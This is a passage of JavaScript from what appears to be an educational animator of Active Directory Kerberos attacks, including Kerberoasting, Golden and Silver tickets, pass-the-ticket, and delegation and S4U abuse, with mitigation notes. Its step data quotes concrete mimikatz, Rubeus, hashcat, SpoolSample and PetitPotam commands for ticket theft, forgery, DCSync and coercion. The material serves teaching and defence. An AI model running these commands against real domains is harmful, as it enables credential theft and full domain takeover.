				},
				{
					title: '4. Request Service Ticket',
					desc: 'Request TGS for target SPN. KDC doesn\'t check if requester actually needs the service!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'TGS-REQ (SPN)', type: 'tgs-req' },
					packet: { 'sname': 'MSSQLSvc/sql01.domain.com:1433', 'etype': '[23] ← RC4 for easy cracking' }
				},
				{
					title: '5. Receive Service Ticket',
					desc: 'KDC returns ticket encrypted with service account\'s NT hash. This is what we crack!',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'TGS-REP', type: 'tgs-rep' },
					packet: { 'ticket': '{ENCRYPTED WITH SERVICE HASH}', '→ Crackable offline!': '' }
				},
				{
					title: '6. Crack Service Ticket',
					desc: 'Extract ticket hash and crack offline with GPU.',
					active: 'attacker',
					tech: `<b>Hashcat:</b> <code>hashcat -m 13100 tgs.txt wordlist</code><br><b>Mode 13100:</b> RC4 | <b>Mode 19700:</b> AES`
				},
				{
					title: '7. Service Account Owned!',
					desc: 'Service accounts often have admin rights on servers or sensitive permissions.',
					active: 'attacker',
					warning: 'Mitigations: gMSA, 25+ char passwords, AES only, least privilege'
				}
			]
		},

		'golden-ticket': {
			title: 'Golden Ticket Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has KRBTGT Hash', x: 8, y: 45 },
				{ id: 'forged', type: 'krbtgt', label: 'Forged TGT', sublabel: 'Golden Ticket', x: 40, y: 75 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 55, y: 20 },
				{ id: 'service', type: 'service', label: 'Any Service', sublabel: 'Full Domain Access', x: 88, y: 45 }
			],
			steps: [
				{
					title: 'Prerequisites: KRBTGT Hash',
					desc: 'Attacker has extracted KRBTGT account hash via DCSync, NTDS.dit dump, or DC compromise.',
					active: 'attacker',
					warning: 'KRBTGT hash = Keys to entire domain!'
				},
				{
					title: '1. Gather Domain Info',
					desc: 'Need: KRBTGT hash, Domain SID, Domain name. User can be anything—even non-existent!',
					active: 'attacker',
					tech: `<b>Required:</b><br>• KRBTGT NT hash<br>• Domain SID: S-1-5-21-xxx-xxx-xxx<br>• Domain FQDN`
				},
				{
					title: '2. Forge Golden Ticket',
					desc: 'Create fake TGT with arbitrary identity and group memberships. Encrypt with KRBTGT hash.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'forged', label: 'Forge TGT', type: 'ticket' },
					tech: `<code>mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt</code>`,
					packet: { 'cname': 'FakeAdmin (any name)', 'PAC.Groups': '[512,519,518,544] All admin groups!', 'endtime': '10 years from now', 'encrypted with': 'KRBTGT hash' }
				},
				{
					title: '3. Inject Ticket',
					desc: 'Golden ticket injected into session. No KDC contact needed for this step!',
					active: 'attacker',
					tech: `<b>Pass-the-Ticket:</b><br>• Mimikatz /ptt flag<br>• Rubeus ptt<br>• Export to .kirbi/.ccache`
				},
				{
					title: '4. Request Service Tickets',
					desc: 'Use golden ticket to request service tickets from KDC. KDC trusts it because encryption is valid.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'TGS-REQ + Golden', type: 'tgs-req' }
				},
				{
					title: '5. KDC Issues Service Tickets',
					desc: 'KDC decrypts TGT successfully (valid KRBTGT encryption), extracts fake PAC, creates service tickets.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'TGS-REP', type: 'tgs-rep' }
				},
				{
					title: '6. Access Any Service',
					desc: 'Present service ticket. Service sees legitimate Domain Admin!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service', label: 'AP-REQ', type: 'ap-req' }
				},
				{
					title: '7. Persistent Domain Compromise',
					desc: 'Valid for 10 years. Survives password changes, account disabling. Only fix: change KRBTGT password TWICE.',
					active: 'service',
					warning: 'Must change KRBTGT password twice with TGT lifetime gap between changes!'
				}
			]
		},

		'silver-ticket': {
			title: 'Silver Ticket Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has Service Hash', x: 10, y: 45 },
				{ id: 'forged', type: 'service', label: 'Forged Ticket', sublabel: 'Silver Ticket', x: 45, y: 75 },
				{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'e.g., SQL/CIFS', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'Prerequisites: Service Account Hash',
					desc: 'Obtained via Kerberoasting, LSASS dump, or credential theft. Scope limited to single service.',
					active: 'attacker',
					tech: `<b>Golden vs Silver:</b><br>• Golden: KRBTGT hash → all services<br>• Silver: Service hash → that service only<br>• Silver: No DC contact → stealthier!`
				},
				{
					title: '1. Gather Service Info',
					desc: 'Need: Service account hash, SPN, Domain SID.',
					active: 'attacker',
					tech: `<b>Common targets:</b><br>• CIFS - File shares<br>• HTTP - Web apps<br>• MSSQLSvc - Databases<br>• HOST - WinRM/PSRemoting`
				},
				{
					title: '2. Forge Silver Ticket',
					desc: 'Create fake service ticket with arbitrary PAC. Encrypt with service account hash.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'forged', label: 'Forge Ticket', type: 'ticket' },
					tech: `<code>mimikatz # kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /target:sql01 /service:MSSQLSvc /rc4:HASH /ptt</code>`
				},
				{
					title: '3. Access Service Directly',
					desc: 'Present forged ticket directly to service. NO KDC INVOLVED!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service', label: 'AP-REQ + Silver', type: 'ap-req' }
				},
				{
					title: '4. Service Validates Ticket',
					desc: 'Service decrypts ticket (encryption valid), extracts fake PAC with admin groups.',
					active: 'service',
					tech: `<b>Why it works:</b><br>• Valid encryption = trusted<br>• Many services skip PAC validation<br>• No DC logs for this access!`
				},
				{
					title: '5. Service Compromised',
					desc: 'Admin access to specific service. Very stealthy—minimal logging.',
					active: 'service',
					warning: 'Mitigations: PAC validation, gMSA, monitor service logs'
				}
			]
		},

		'pass-the-ticket': {
			title: 'Pass-the-Ticket Attack',
			entities: [
				{ id: 'victim', type: 'client', label: 'Victim', sublabel: 'Has Valid Tickets', x: 10, y: 20 },
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Local Admin', x: 10, y: 70 },
				{ id: 'service', type: 'service', label: 'Service', sublabel: 'Target', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'Concept: Ticket Theft',
					desc: 'Kerberos tickets in memory are authentication tokens. Steal ticket = steal identity.',
					active: 'victim',
					tech: `<b>Storage:</b><br>• Windows: LSASS process<br>• Linux: ccache files or KEYRING<br>• No password needed!`
				},
				{
					title: '1. Compromise Machine',
					desc: 'Gain local admin on machine where target user has tickets cached.',
					active: 'attacker',
					tech: `<b>Scenarios:</b><br>• Admin RDP session<br>• Service account on server<br>• User left session open`
				},
				{
					title: '2. Dump Tickets',
					desc: 'Extract tickets from LSASS memory.',
					active: 'attacker',
					anim: { from: 'victim', to: 'attacker', label: 'Steal Tickets', type: 'malicious' },
					tech: `<b>Commands:</b><br><code>mimikatz # sekurlsa::tickets /export</code><br><code>Rubeus.exe dump</code>`
				},
				{
					title: '3. Inject Stolen Ticket',
					desc: 'Import victim\'s ticket into attacker\'s session.',
					active: 'attacker',
					tech: `<code>mimikatz # kerberos::ptt ticket.kirbi</code><br><code>Rubeus.exe ptt /ticket:BASE64</code>`
				},
				{
					title: '4. Use Victim Identity',
					desc: 'Access services as the victim user.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service', label: 'AP-REQ (stolen)', type: 'ap-req' }
				},
				{
					title: '5. Identity Hijacked',
					desc: 'Full access as victim. If victim is admin → admin access.',
					active: 'service',
					warning: 'Mitigations: Protected Users group, Credential Guard, short ticket lifetimes'
				}
			]
		},

		'overpass-hash': {
			title: 'Overpass-the-Hash Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has NT Hash', x: 10, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 45 },
				{ id: 'service', type: 'service', label: 'Service', sublabel: 'Kerberos Only', x: 88, y: 45 }
			],
			steps: [
				{
					title: 'Concept: Hash → Kerberos',
					desc: 'Convert NTLM hash to Kerberos TGT. Bypasses systems that block NTLM.',
					active: 'attacker',
					tech: `<b>Pass-the-Hash:</b> NTLM auth<br><b>Overpass-the-Hash:</b> Use hash to get Kerberos ticket<br>More stealthy, works with Kerberos-only systems`
				},
				{
					title: '1. Obtain NT Hash',
					desc: 'Get target user\'s NTLM hash via LSASS dump, DCSync, or SAM extraction.',
					active: 'attacker',
					tech: `<b>Sources:</b><br>• <code>sekurlsa::logonpasswords</code><br>• <code>lsadump::dcsync</code><br>• SAM database`
				},
				{
					title: '2. Request TGT with Hash',
					desc: 'Use NT hash directly for Kerberos pre-authentication (hash IS the key).',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ (hash)', type: 'as-req' },
					tech: `<code>mimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd</code><br><code>Rubeus.exe asktgt /user:admin /rc4:HASH</code>`
				},
				{
					title: '3. Receive Valid TGT',
					desc: 'KDC validates pre-auth (can\'t tell hash was used directly) and issues TGT.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP + TGT', type: 'as-rep' }
				},
				{
					title: '4. Access Services',
					desc: 'Use TGT to access any service. Appears as normal Kerberos authentication.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service', label: 'Kerberos Auth', type: 'ap-req' }
				},
				{
					title: '5. Kerberos Access from Hash',
					desc: 'Full Kerberos authentication without knowing password. Bypasses NTLM blocks.',
					active: 'service',
					warning: 'Mitigations: Protected Users, Credential Guard, AES-only (blocks RC4)'
				}
			]
		},

		'unconstrained-deleg': {
			title: 'Unconstrained Delegation Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Controls Server', x: 8, y: 45 },
				{ id: 'delegsrv', type: 'service', label: 'Deleg Server', sublabel: 'Unconstrained', x: 38, y: 45 },
				{ id: 'victim', type: 'client', label: 'DC/Admin', sublabel: 'High Value', x: 68, y: 15 },
				{ id: 'dc', type: 'dc', label: 'Domain Controller', sublabel: 'Target', x: 88, y: 65 }
			],
			steps: [
				{
					title: 'What is Unconstrained Delegation?',
					desc: 'Server can impersonate ANY user to ANY service. Stores user\'s TGT in memory!',
					active: 'delegsrv',
					tech: `<b>UAC Flag:</b> TRUSTED_FOR_DELEGATION (0x80000)<br><b>Find:</b> <code>(userAccountControl:1.2.840.113556.1.4.803:=524288)</code>`
				},
				{
					title: '1. Compromise Delegation Server',
					desc: 'Get admin access to server with unconstrained delegation enabled.',
					active: 'attacker',
					tech: `<b>Find targets:</b><br>• BloodHound: "Unconstrained Delegation"<br>• <code>Get-ADComputer -Filter {TrustedForDelegation -eq $true}</code>`
				},
				{
					title: '2. Coerce DC Authentication',
					desc: 'Force DC to authenticate to delegation server using PrinterBug, PetitPotam, etc.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'victim', label: 'Coerce Auth', type: 'malicious' },
					tech: `<b>Coercion:</b><br>• <code>SpoolSample.exe DC01 ATTACKER-SRV</code><br>• <code>PetitPotam.py ATTACKER-SRV DC01</code>`
				},
				{
					title: '3. DC Authenticates with TGT',
					desc: 'DC\'s machine account authenticates. TGT forwarded and cached on delegation server!',
					active: 'victim',
					anim: { from: 'victim', to: 'delegsrv', label: 'Auth + TGT!', type: 'ticket' },
					warning: 'DC machine account TGT is now on attacker-controlled server!'
				},
				{
					title: '4. Extract DC\'s TGT',
					desc: 'Dump the DC machine account TGT from LSASS.',
					active: 'attacker',
					anim: { from: 'delegsrv', to: 'attacker', label: 'Steal TGT', type: 'malicious' },
					tech: `<code>Rubeus.exe monitor /interval:5</code><br><code>mimikatz # sekurlsa::tickets /export</code>`
				},
				{
					title: '5. DCSync Attack',
					desc: 'Use DC\'s TGT to perform DCSync and extract all domain hashes.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'dc', label: 'DCSync', type: 'malicious' },
					tech: `<code>mimikatz # lsadump::dcsync /all</code><br>Get KRBTGT hash → Golden Ticket!`
				},
				{
					title: '6. Domain Compromise!',
					desc: 'All password hashes extracted. KRBTGT enables persistent access.',
					active: 'dc',
					warning: 'Mitigations: Remove unconstrained delegation, use constrained/RBCD, Protected Users for admins'
				}
			]
		},

		'constrained-deleg': {
			title: 'Constrained Delegation Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Has Service Hash', x: 8, y: 45 },
				{ id: 'service1', type: 'service', label: 'Service A', sublabel: 'Constrained Deleg', x: 35, y: 25 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 55, y: 70 },
				{ id: 'service2', type: 'service2', label: 'Service B', sublabel: 'Allowed Target', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'What is Constrained Delegation?',
					desc: 'Service A can impersonate users to specific services (Service B) listed in msDS-AllowedToDelegateTo.',
					active: 'service1',
					tech: `<b>Attribute:</b> msDS-AllowedToDelegateTo<br>Example: <code>MSSQLSvc/sql01.corp.local</code><br>Only works with Protocol Transition if "Use any auth" enabled`
				},
				{
					title: '1. Compromise Delegating Service',
					desc: 'Obtain hash of service account with constrained delegation configured.',
					active: 'attacker',
					tech: `<b>Find targets:</b><br><code>Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"}</code><br>Check "Trust this user for delegation" settings`
				},
				{
					title: '2. S4U2Self - Get Ticket as Any User',
					desc: 'Service requests ticket to ITSELF on behalf of any user (even those who never authenticated).',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
					packet: { 'Service requests': 'Ticket to itself', 'For user': 'Administrator (any user!)', 'Result': 'Forwardable ticket for that user' }
				},
				{
					title: '3. Receive Forwardable Ticket',
					desc: 'KDC returns service ticket for target user TO the compromised service.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'User Ticket', type: 'tgs-rep' }
				},
				{
					title: '4. S4U2Proxy - Delegate to Target',
					desc: 'Use S4U2Self ticket to request ticket to allowed target service as the impersonated user.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Proxy', type: 's4u' },
					packet: { 'Present': 'S4U2Self ticket', 'Request ticket to': 'Allowed target service', 'As user': 'Administrator' }
				},
				{
					title: '5. Receive Target Service Ticket',
					desc: 'KDC validates delegation is allowed, returns service ticket to target.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'Target Ticket', type: 'tgs-rep' }
				},
				{
					title: '6. Access Target as Admin',
					desc: 'Present ticket to target service. You\'re now the impersonated user!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service2', label: 'AP-REQ', type: 'ap-req' }
				},
				{
					title: '7. Target Service Compromised',
					desc: 'Admin access to target service. Often leads to lateral movement or priv esc.',
					active: 'service2',
					warning: 'Note: Service name in ticket can often be changed (SPN abuse)!'
				}
			]
		},

		's4u2self': {
			title: 'S4U2Self Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'Service Account', x: 10, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 50, y: 45 },
				{ id: 'victim', type: 'client', label: 'Target User', sublabel: 'e.g., Domain Admin', x: 85, y: 20 }
			],
			steps: [
				{
					title: 'What is S4U2Self?',
					desc: 'Service-for-User-to-Self: A service can request a ticket to ITSELF on behalf of ANY user.',
					active: 'attacker',
					tech: `<b>Purpose:</b> Protocol transition - allow users who authenticated via non-Kerberos methods<br><b>Abuse:</b> Get ticket as any user without their password!`
				},
				{
					title: '1. Compromise Service Account',
					desc: 'Need service account with SPN. Can be any service account you control.',
					active: 'attacker',
					tech: `<b>Requirements:</b><br>• Service account hash/password<br>• Account must have SPN<br>• Works even without delegation if ticket is not forwardable`
				},
				{
					title: '2. S4U2Self Request',
					desc: 'Request ticket to our own service on behalf of target user (e.g., Domain Admin).',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
					packet: { 'PA-FOR-USER': 'Administrator@DOMAIN', 'sname': 'Our own SPN', 'Note': 'No proof of user needed!' },
					tech: `<code>Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator</code>`
				},
				{
					title: '3. KDC Returns User Ticket',
					desc: 'KDC creates ticket to our service as if the target user authenticated to us.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'TGS (as Admin)', type: 'tgs-rep' },
					tech: `<b>Ticket contains:</b><br>• PAC with target user's identity<br>• Groups and privileges of target user<br>• Forwardable flag based on account settings`
				},
				{
					title: '4. Ticket Obtained',
					desc: 'We now have a valid service ticket as the target user to our service. Use for S4U2Proxy or modify SPN.',
					active: 'attacker',
					warning: 'If TRUSTED_TO_AUTH_FOR_DELEGATION set, ticket is forwardable → S4U2Proxy works'
				}
			]
		},

		's4u2proxy': {
			title: 'S4U2Proxy Attack',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'With S4U2Self Ticket', x: 8, y: 45 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 45, y: 20 },
				{ id: 'service', type: 'service', label: 'Target Service', sublabel: 'In AllowedToDelegateTo', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'What is S4U2Proxy?',
					desc: 'Service-for-User-to-Proxy: Use a forwardable user ticket to request tickets to OTHER services as that user.',
					active: 'attacker',
					tech: `<b>Chain:</b> S4U2Self → get user ticket → S4U2Proxy → get ticket to target service<br><b>Requires:</b> Forwardable ticket + msDS-AllowedToDelegateTo`
				},
				{
					title: '1. Have Forwardable User Ticket',
					desc: 'From S4U2Self or pass-the-ticket. Must be forwardable for S4U2Proxy.',
					active: 'attacker',
					tech: `<b>Sources:</b><br>• S4U2Self (if TRUSTED_TO_AUTH_FOR_DELEGATION)<br>• Stolen forwardable ticket<br>• Unconstrained delegation capture`
				},
				{
					title: '2. S4U2Proxy Request',
					desc: 'Present forwardable ticket, request ticket to target service in AllowedToDelegateTo.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Proxy', type: 's4u' },
					packet: { 'additional-tickets': 'Forwardable S4U2Self ticket', 'sname': 'CIFS/target.domain.com', 'Must be in': 'msDS-AllowedToDelegateTo' }
				},
				{
					title: '3. KDC Validates Delegation',
					desc: 'KDC checks: Is target SPN in AllowedToDelegateTo? Is ticket forwardable? Is user allowed?',
					active: 'kdc',
					tech: `<b>Checks:</b><br>• Target in AllowedToDelegateTo ✓<br>• Ticket is forwardable ✓<br>• User not in Protected Users ✓`
				},
				{
					title: '4. Receive Target Service Ticket',
					desc: 'KDC issues ticket to target service as the impersonated user.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'Service Ticket', type: 'tgs-rep' }
				},
				{
					title: '5. Access Target Service',
					desc: 'Present ticket to target. We\'re authenticated as the impersonated user!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'service', label: 'AP-REQ', type: 'ap-req' }
				},
				{
					title: '6. Impersonation Complete',
					desc: 'Full access as target user to the delegated service.',
					active: 'service',
					warning: 'SPN in ticket can sometimes be modified to access other services (same account)!'
				}
			]
		},

		'rbcd': {
			title: 'Resource-Based Constrained Delegation (RBCD)',
			entities: [
				{ id: 'attacker', type: 'attacker', label: 'Attacker', sublabel: 'GenericWrite on Target', x: 8, y: 45 },
				{ id: 'controlled', type: 'service', label: 'Controlled Acct', sublabel: 'With SPN', x: 35, y: 20 },
				{ id: 'kdc', type: 'kdc', label: 'KDC', sublabel: 'Domain Controller', x: 55, y: 70 },
				{ id: 'target', type: 'service2', label: 'Target', sublabel: 'Computer/Service', x: 85, y: 45 }
			],
			steps: [
				{
					title: 'What is RBCD?',
					desc: 'Resource decides who can delegate TO it (opposite of constrained). Configured via msDS-AllowedToActOnBehalfOfOtherIdentity.',
					active: 'target',
					tech: `<b>Classic Constrained:</b> Source defines where it CAN delegate<br><b>RBCD:</b> Target defines who CAN delegate to it<br>Target\'s attribute, not source\'s!`
				},
				{
					title: '1. Check Permissions',
					desc: 'Need GenericWrite/GenericAll on target computer object to modify its msDS-AllowedToActOnBehalfOfOtherIdentity.',
					active: 'attacker',
					tech: `<b>Find targets:</b><br>• BloodHound: GenericWrite edges to computers<br>• Check if you can create computer accounts (default: 10)`
				},
				{
					title: '2. Create/Control Account with SPN',
					desc: 'Need an account with SPN. Create machine account or use existing controlled account.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'controlled', label: 'Control', type: 'ticket' },
					tech: `<b>Create machine account:</b><br><code>New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Pass123' -AsPlain -Force)</code>`
				},
				{
					title: '3. Configure RBCD on Target',
					desc: 'Set msDS-AllowedToActOnBehalfOfOtherIdentity on target to allow our controlled account.',
					active: 'attacker',
					anim: { from: 'attacker', to: 'target', label: 'Set RBCD', type: 'malicious' },
					tech: `<code>Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$</code><br>or PowerView: <code>Set-DomainObject</code>`
				},
				{
					title: '4. S4U2Self from Controlled Account',
					desc: 'Request ticket to our controlled account as target user (e.g., Admin).',
					active: 'attacker',
					anim: { from: 'attacker', to: 'kdc', label: 'S4U2Self', type: 's4u' },
					tech: `<code>Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/TARGET /ptt</code>`
				},
				{
					title: '5. S4U2Proxy to Target',
					desc: 'Use S4U2Self ticket to get ticket to target service. KDC checks RBCD attribute.',
					active: 'kdc',
					anim: { from: 'kdc', to: 'attacker', label: 'Target Ticket', type: 'tgs-rep' },
					tech: `<b>KDC checks:</b><br>Is FAKE01$ in TARGET's msDS-AllowedToActOnBehalfOfOtherIdentity? → Yes → Issue ticket`
				},
				{
					title: '6. Access Target as Admin',
					desc: 'Present ticket. We\'re now Domain Admin on the target computer!',
					active: 'attacker',
					anim: { from: 'attacker', to: 'target', label: 'AP-REQ', type: 'ap-req' }
				},
				{
					title: '7. Target Compromised!',
					desc: 'Local admin on target. If target is DC → domain compromise.',
					active: 'target',
					warning: 'Mitigations: Audit GenericWrite ACLs, Protected Users, monitor RBCD changes'
				}
			]
		}
	};

	// ==================== STATE ====================
	let currentTopic = 'kerberos-auth';
	let currentStep = 0;
	let currentCategory = 'auth';
	let isPlaying = false;
	let animSpeed = 1;
	let animTimeout = null;

	// ==================== INITIALIZATION ====================
	document.addEventListener('DOMContentLoaded', () => {
		setupEventListeners();
		renderTopicButtons();
		loadTopic('kerberos-auth');
	});

	function setupEventListeners() {
		document.getElementById('playBtn').addEventListener('click', play);
		document.getElementById('pauseBtn').addEventListener('click', pause);
		document.getElementById('stepBtn').addEventListener('click', nextStep);
		document.getElementById('resetBtn').addEventListener('click', reset);
		document.getElementById('speedControl').addEventListener('input', (e) => {
			animSpeed = parseFloat(e.target.value);
			document.getElementById('speedLabel').textContent = animSpeed + 'x';
		});

		document.querySelectorAll('.category-tab').forEach(tab => {
			tab.addEventListener('click', () => {
				document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
				tab.classList.add('active');
				currentCategory = tab.dataset.category;
				renderTopicButtons();
			});
		});
	}

	function renderTopicButtons() {
		const nav = document.getElementById('topicNav');
		const buttons = topicCategories[currentCategory];
		nav.innerHTML = buttons.map(b =>
			`<button class="topic-btn ${b.class} ${b.id === currentTopic ? 'active' : ''}" data-topic="${b.id}">
				<i class="fas ${b.icon}"></i> ${b.name}
			</button>`
		).join('');

		nav.querySelectorAll('.topic-btn').forEach(btn => {
			btn.addEventListener('click', () => loadTopic(btn.dataset.topic));
		});
	}

	// ==================== TOPIC LOADING ====================
	function loadTopic(topicId) {
		currentTopic = topicId;
		currentStep = 0;
		pause();

		document.querySelectorAll('.topic-btn').forEach(b => b.classList.remove('active'));
		document.querySelector(`[data-topic="${topicId}"]`)?.classList.add('active');

		renderEntities();
		renderStepIndicator();
		updateExplanation();
		updateStepProgress();
	}

	function renderEntities() {
		const container = document.getElementById('flowchartContainer');
		const topic = topics[currentTopic];

		// Clear old entities
		container.querySelectorAll('.entity').forEach(e => e.remove());

		// Add new entities
		topic.entities.forEach(ent => {
			const div = document.createElement('div');
			div.className = 'entity';
			div.id = `entity-${ent.id}`;
			div.style.left = `${ent.x}%`;
			div.style.top = `${ent.y}%`;
			div.style.transform = 'translate(-50%, -50%)';
			div.innerHTML = `
				<div class="entity-icon ${ent.type}" id="icon-${ent.id}">
					<i class="fas ${getIcon(ent.type)}"></i>
				</div>
				<div class="entity-label">${ent.label}</div>
				<div class="entity-sublabel">${ent.sublabel}</div>
			`;
			container.appendChild(div);
		});
	}

	function getIcon(type) {
		return { client: 'fa-user', kdc: 'fa-server', krbtgt: 'fa-key', service: 'fa-database', service2: 'fa-hdd', attacker: 'fa-user-secret', dc: 'fa-building', database: 'fa-database' }[type] || 'fa-circle';
	}

	function renderStepIndicator() {
		const container = document.getElementById('stepIndicator');
		const steps = topics[currentTopic].steps;
		container.innerHTML = steps.map((_, i) =>
			`<div class="step-dot ${currentTopic !== 'kerberos-auth' ? 'attack' : ''} ${i === currentStep ? 'active' : ''} ${i < currentStep ? 'completed' : ''}" data-step="${i}"></div>`
		).join('');

		container.querySelectorAll('.step-dot').forEach(dot => {
			dot.addEventListener('click', () => goToStep(parseInt(dot.dataset.step)));
		});
	}

	function updateStepProgress() {
		const steps = topics[currentTopic].steps;
		document.getElementById('stepCurrent').textContent = currentStep + 1;
		document.getElementById('stepTotal').textContent = steps.length;
	}

	// ==================== EXPLANATION ====================
	function updateExplanation() {
		const topic = topics[currentTopic];
		const step = topic.steps[currentStep];
		const panel = document.getElementById('stepContent');

		let html = `<div class="step-title">${step.title}</div>`;
		html += `<p class="step-desc">${step.desc}</p>`;

		if (step.tech) html += `<div class="tech-detail">${step.tech}</div>`;
		if (step.warning) html += `<div class="warning-box"><i class="fas fa-exclamation-triangle"></i>${step.warning}</div>`;
		if (step.success) html += `<div class="success-box"><i class="fas fa-check-circle"></i>Authentication/Attack completed successfully!</div>`;

		if (step.packet) {
			html += `<div class="packet-contents">`;
			for (const [k, v] of Object.entries(step.packet)) {
				const isEnc = v.toLowerCase().includes('encrypt');
				html += `<div class="field"><span class="field-name">${k}</span><span class="field-value ${isEnc ? 'encrypted' : ''}">${v}</span></div>`;
			}
			html += `</div>`;
		}

		panel.innerHTML = html;

		// Update active entity
		document.querySelectorAll('.entity-icon').forEach(el => el.classList.remove('active'));
		if (step.active) {
			document.getElementById(`icon-${step.active}`)?.classList.add('active');
		}

		renderStepIndicator();
		updateStepProgress();
	}

	// ==================== ANIMATION ====================
	function play() {
		isPlaying = true;
		document.getElementById('playBtn').style.display = 'none';
		document.getElementById('pauseBtn').style.display = 'inline-flex';
		animateStep();
	}

	function pause() {
		isPlaying = false;
		document.getElementById('playBtn').style.display = 'inline-flex';
		document.getElementById('pauseBtn').style.display = 'none';
		if (animTimeout) clearTimeout(animTimeout);
	}

	function reset() {
		pause();
		currentStep = 0;
		document.querySelectorAll('.packet, .packet-trail').forEach(p => p.remove());
		updateExplanation();
	}

	function nextStep() {
		const steps = topics[currentTopic].steps;
		if (currentStep < steps.length - 1) {
			currentStep++;
			animateStep();
		}
	}

	function goToStep(step) {
		pause();
		currentStep = step;
		document.querySelectorAll('.packet, .packet-trail').forEach(p => p.remove());
		updateExplanation();
	}

	function animateStep() {
		const topic = topics[currentTopic];
		const step = topic.steps[currentStep];

		updateExplanation();

		if (step.anim) {
			animatePacket(step.anim, () => {
				if (isPlaying) {
					animTimeout = setTimeout(() => {
						if (currentStep < topic.steps.length - 1) {
							currentStep++;
							animateStep();
						} else {
							pause();
						}
					}, 2000 / animSpeed);
				}
			});
		} else {
			if (isPlaying) {
				animTimeout = setTimeout(() => {
					if (currentStep < topic.steps.length - 1) {
						currentStep++;
						animateStep();
					} else {
						pause();
					}
				}, 2500 / animSpeed);
			}
		}
	}

	function animatePacket(anim, callback) {
		const container = document.getElementById('flowchartContainer');
		const fromEl = document.getElementById(`entity-${anim.from}`);
		const toEl = document.getElementById(`entity-${anim.to}`);

		if (!fromEl || !toEl) { callback(); return; }

		const cRect = container.getBoundingClientRect();
		const fRect = fromEl.querySelector('.entity-icon').getBoundingClientRect();
		const tRect = toEl.querySelector('.entity-icon').getBoundingClientRect();

		const startX = fRect.left - cRect.left + fRect.width/2;
		const startY = fRect.top - cRect.top + fRect.height/2;
		const endX = tRect.left - cRect.left + tRect.width/2;
		const endY = tRect.top - cRect.top + tRect.height/2;

		// Create packet
		const packet = document.createElement('div');
		packet.className = `packet ${anim.type}`;
		packet.innerHTML = `<i class="fas fa-envelope"></i> ${anim.label}`;
		packet.style.left = startX + 'px';
		packet.style.top = startY + 'px';
		packet.style.transform = 'translate(-50%, -50%)';
		packet.style.opacity = '0';
		container.appendChild(packet);

		// Animate
		requestAnimationFrame(() => {
			packet.style.transition = `all ${1.2/animSpeed}s cubic-bezier(0.4, 0, 0.2, 1)`;
			packet.style.opacity = '1';

			// Create trail effect
			const trailCount = 5;
			const colors = { 'as-req': '#4a9eff', 'as-rep': '#f39c12', 'tgs-req': '#9b59b6', 'tgs-rep': '#27ae60', 'ap-req': '#00d2ff', 'ap-rep': '#2ecc71', 'malicious': '#e74c3c', 'ticket': '#f1c40f', 's4u': '#9b59b6' };
			const color = colors[anim.type] || '#4a9eff';

			for (let i = 0; i < trailCount; i++) {
				setTimeout(() => {
					const trail = document.createElement('div');
